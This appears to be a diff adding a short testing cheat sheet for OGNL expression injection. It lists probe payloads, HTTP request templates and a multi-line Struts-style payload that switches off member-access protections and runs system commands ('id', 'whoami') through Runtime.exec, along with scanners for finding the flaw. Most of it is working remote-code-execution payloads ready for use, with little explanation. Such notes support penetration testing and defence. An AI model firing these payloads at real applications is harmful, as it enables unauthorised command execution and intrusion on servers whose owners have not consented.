@@ -1,0 +1,40 @@
+# Manual Testing
+
+1.  %{1+1}
+2.  %{@java.lang.Runtime@getRuntime().exec('whoami')}
+
+Look for:
+  1. Application crashes
+  2. Arbitrary code execution
+  3. Unexpected outputs (like 2, or system info
+
+# Automated Tools
+
+1.  OWASP ZAP
+2.  Nuclei Templates
+3.  Source code review (Look for calls to OGNL APIs)
+4.  Burp Suite Active Scanner
+
+# Testing Payload Templates
+
+1.       GET /app?name=%{1+1}
+2.       GET /app?name=%{@java.lang.Runtime@getRuntime().exec('id')}
+3.       %{@java.lang.System@getenv('PATH')}
+
+# EXAMPLES
+1:  Basic Expression Evaluation
+
+        "String userInput = "%{1+1}";
+         someOGNLContext.evaluate(userInput);  // Result: 2"
+
+2:  Accessing System Properties
+
+        "%{#a=@java.lang.System@getProperty('os.name')}"      //Sets #a to the OS name (like Windows 10 or Linux)//
+
+3:  Arbitrary Command Execution (RCE)
+
+         " %{(#_='multipart/form-data').
+          (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+          (#context['xwork.MethodAccessor.denyMethodExecution']=false).
+          (#_memberAccess=#dm).
+          (@java.lang.Runtime@getRuntime().exec('id'))} "
